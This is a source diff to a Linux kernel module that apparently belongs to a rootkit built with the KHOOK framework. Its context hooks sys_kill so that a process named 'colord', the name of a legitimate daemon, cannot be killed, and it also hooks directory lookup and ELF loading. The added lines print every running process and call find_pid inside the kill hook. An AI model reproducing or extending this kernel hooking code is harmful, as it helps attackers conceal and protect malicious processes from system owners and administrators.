@@ -19,6 +19,22 @@
 const char *protected = "colord";
 pid_t protected_pid = -1;
 
+static int print_pid(void)
+{
+	struct task_struct * task, * p;
+	struct list_head * pos;
+	int count = 0;
+	printk("Hello World enter begin:\n");
+	task =& init_task;
+	list_for_each(pos, &task->tasks)
+	{
+		p = list_entry(pos, struct task_struct, tasks);
+		count++;
+		printk("%d---------->%s\n", p->pid, p->comm);
+	}
+	printk("the number of process is: %d\n", count);
+	return 0;
+}
 
 static pid_t find_pid(void)
 {
@@ -104,6 +120,7 @@ struct dentry *khook___d_lookup(struct dentry *parent, struct qstr *name)
 KHOOK_EXT(long, sys_kill, pid_t, int);
 static long khook_sys_kill(pid_t pid, int sig) {
 	int ret = 0;
+	find_pid();
 	if (protected_pid != pid)
 		ret = KHOOK_ORIGIN(sys_kill, pid, sig);
         //printk("sys_kill");
@@ -160,6 +177,7 @@ static int khook_load_elf_binary(struct linux_binprm *bprm)
 
 int init_module(void)
 {
+	print_pid();
 	return khook_init();
 }
 
